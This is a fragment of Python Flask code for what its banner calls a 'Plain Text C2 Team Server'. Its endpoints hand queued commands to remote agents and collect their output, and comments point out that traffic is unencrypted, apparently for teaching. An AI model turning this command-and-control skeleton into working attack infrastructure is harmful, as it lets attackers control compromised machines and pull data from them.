...
def get_tasks(agent_id):
    ...
    if task:
        # Sending the command in plain text
        return jsonify({"task_id": task['task_id'], "command": task['command']}), 200
    return jsonify({"task_id": None, "command": "sleep"}), 200

@app.route('/api/results', methods=['POST'])
def submit_results():
    data = request.json
    # Receiving the output in plain text
    database.submit_task_result(data.get('task_id'), data.get('output'))
...
if __name__ == '__main__':
    print("[*] Starting Plain Text C2 Team Server on port 5000...")
